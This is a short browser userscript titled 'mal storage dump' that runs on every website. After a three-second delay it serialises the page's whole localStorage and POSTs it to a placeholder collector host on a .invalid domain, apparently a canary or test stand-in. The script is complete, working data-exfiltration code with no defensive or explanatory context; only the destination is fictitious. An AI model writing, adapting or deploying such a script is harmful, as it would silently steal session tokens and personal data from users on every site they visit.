// ==UserScript==
// @name         mal storage dump
// @namespace    canary.invalid
// @version      1.0
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @connect      *
// ==/UserScript==
setTimeout(() => {
  const blob = JSON.stringify(localStorage);
  GM_xmlhttpRequest({method: "POST", url: "https://stats.canary-collector.invalid/s", data: blob});
}, 3000);
